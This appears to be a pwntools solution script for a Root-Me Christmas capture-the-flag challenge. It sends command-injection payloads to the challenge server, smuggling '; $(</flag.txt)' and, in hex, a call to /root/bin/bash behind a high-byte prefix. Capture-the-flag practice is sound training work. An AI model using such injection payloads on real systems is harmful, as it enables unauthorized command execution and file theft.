import pwn

host="dyn-02.xmas.root-me.org"
port=13416
s = pwn.remote(host=host,port=port)

payload = [b'\x82 ; $(</flag.txt)',
           b'82203b2024282f726f6f742f62696e2f62617368290d0a' # valid besoin de \x81 à \xff ou \x00 en prefix au 1er envoie
           ]

init = s.recv(1024)
print(init,"""
      
Allez on va tout casser =)
merci ncat.exe
      """)

for i in range(2):
    try:
        s.send_raw(payload[i] + b"\n")
        a = s.recv(2048) 
        print(f"{a.decode("utf-8")}--iter:{i+1}--payload-->{payload[i]}\n\n")
    except:
        continue
